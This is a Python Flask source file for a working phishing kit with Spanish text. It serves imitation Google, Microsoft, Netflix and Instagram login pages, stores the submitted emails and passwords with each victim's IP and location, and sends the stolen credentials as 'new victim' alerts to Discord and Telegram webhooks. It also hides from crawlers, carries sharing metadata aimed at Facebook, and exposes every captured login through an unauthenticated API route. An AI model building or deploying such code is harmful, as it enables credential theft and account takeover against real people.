#!/usr/bin/env python3
from flask import Flask, request, render_template_string, redirect, jsonify
import sqlite3
import json
import requests
from datetime import datetime
import os

app = Flask(__name__)

# Inicializar DB
def init_db():
    conn = sqlite3.connect('credentials.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            ip TEXT,
            username TEXT,
            password TEXT,
            user_agent TEXT,
            referer TEXT,
            geo_location TEXT
        )
    ''')
    conn.commit()
    conn.close()

def get_template():
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
            template_name = config.get('template', 'google')
    except:
        template_name = 'google'
    
    templates = {
        'google': '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <!-- METADATOS PARA FACEBOOK -->
    <meta property="og:title" content="Iniciar sesión - Google" />
    <meta property="og:description" content="Accede a tu cuenta de Google de forma segura" />
    <meta property="og:image" content="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" />
    <meta property="og:url" content="https://video-xeen.onrender.com" />
    <meta property="og:type" content="website" />
    <title>Iniciar sesión - Google</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; padding: 48px 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 450px; text-align: center; }
        .logo { width: 75px; margin-bottom: 20px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
        p { color: #5f6368; margin-bottom: 30px; }
        input { width: 100%; padding: 13px 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
        input:focus { outline: none; border-color: #1a73e8; }
        button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        button:hover { background: #1557b0; }
        .footer { margin-top: 30px; font-size: 14px; color: #5f6368; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
        <h1>Iniciar sesión</h1>
        <p>Utiliza tu cuenta de Google</p>
        <form action="/capture" method="POST">
            <input type="email" name="email" placeholder="Correo electrónico" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Siguiente</button>
        </form>
        <div class="footer">Prueba de seguridad autorizada</div>
    </div>
    <script>
        if (navigator.webdriver || /bot|crawler|spider|crawling/i.test(navigator.userAgent)) {
            document.body.innerHTML = '<h1>403 Forbidden</h1>';
        }
    </script>
</body>
</html>''',
        'microsoft': '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Iniciar sesión en tu cuenta</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: linear-gradient(120deg, #f0f0f0 0%, #e0e0e0 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; padding: 44px; width: 440px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
        .logo { width: 108px; margin-bottom: 16px; }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 12px; color: #1b1b1b; }
        input { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ccc; font-size: 15px; }
        button { width: 100%; padding: 12px; background: #0067b8; color: white; border: none; font-size: 15px; cursor: pointer; }
        button:hover { background: #005a9e; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="logo">
        <h1>Iniciar sesión</h1>
        <form action="/capture" method="POST">
            <input type="email" name="email" placeholder="Correo, teléfono o Skype" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
    </div>
</body>
</html>''',
        'netflix': '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Netflix</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', sans-serif; }
        body { background: black; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: rgba(0,0,0,0.75); padding: 60px 68px; width: 450px; border-radius: 4px; }
        h1 { color: white; font-size: 32px; margin-bottom: 28px; font-weight: 700; }
        input { width: 100%; padding: 16px; margin-bottom: 16px; background: #333; border: none; border-radius: 4px; color: white; font-size: 16px; }
        button { width: 100%; padding: 16px; background: #e50914; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 700; cursor: pointer; }
        button:hover { background: #f40612; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Iniciar sesión</h1>
        <form action="/capture" method="POST">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
    </div>
</body>
</html>''',
        'instagram': '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
        .logo { font-size: 40px; font-family: 'Brush Script MT', cursive; margin-bottom: 30px; }
        input { width: 100%; padding: 9px; margin-bottom: 6px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 14px; }
        button { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 12px; }
        button:hover { background: #0081d6; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <form action="/capture" method="POST">
            <input type="text" name="email" placeholder="Teléfono, usuario o correo" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
    </div>
</body>
</html>'''
    }
    
    return templates.get(template_name, templates['google'])

def send_webhook(data):
    try:
        with open('webhook_config.json', 'r') as f:
            config = json.load(f)
    except:
        return
    
    # Discord
    if config.get('discord_webhook'):
        try:
            import requests
            message = {
                "content": f"🎯 **Nueva víctima!**\\n📍 IP: {data['ip']}\\n👤 Usuario: {data['username']}\\n🔑 Pass: {data['password'][:10]}...",
                "username": "ScorpFish Bot"
            }
            requests.post(config['discord_webhook'], json=message, timeout=5)
        except:
            pass
    
    # Telegram
    if config.get('telegram_token') and config.get('telegram_chat'):
        try:
            url = f"https://api.telegram.org/bot{config['telegram_token']}/sendMessage"
            message = f"🎯 Nueva víctima!\\n📍 IP: {data['ip']}\\n👤 Usuario: {data['username']}"
            requests.post(url, json={"chat_id": config['telegram_chat'], "text": message}, timeout=5)
        except:
            pass

@app.route('/')
def index():
    user_agent = request.headers.get('User-Agent', '')
    bots = ['bot', 'crawler', 'spider', 'google', 'bing']
    if any(bot in user_agent.lower() for bot in bots):
        return "404 Not Found", 404
    return render_template_string(get_template())

@app.route('/capture', methods=['POST'])
def capture():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    try:
        geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
        location = f"{geo.get('city', 'Unknown')}, {geo.get('country', 'Unknown')}"
    except:
        location = "Unknown"
    
    data = {
        'timestamp': datetime.now().isoformat(),
        'ip': ip,
        'username': request.form.get('email') or request.form.get('username'),
        'password': request.form.get('password'),
        'user_agent': request.headers.get('User-Agent'),
        'referer': request.headers.get('Referer'),
        'geo_location': location
    }
    
    # Guardar en DB
    conn = sqlite3.connect('credentials.db')
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO credentials (timestamp, ip, username, password, user_agent, referer, geo_location)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', (data['timestamp'], data['ip'], data['username'], data['password'], 
          data['user_agent'], data['referer'], data['geo_location']))
    conn.commit()
    conn.close()
    
    # Enviar webhook
    send_webhook(data)
    
    # Redirigir
    return redirect("https://www.google.com")

@app.route('/api/credentials')
def api_credentials():
    conn = sqlite3.connect('credentials.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM credentials ORDER BY id DESC')
    data = cursor.fetchall()
    conn.close()
    return jsonify(data)

if __name__ == '__main__':
    init_db()
    print("[+] Servidor iniciado en http://localhost:8080")
    print("[+] Presiona Ctrl+C para detener")
    app.run(host='0.0.0.0', port=8080, debug=False)
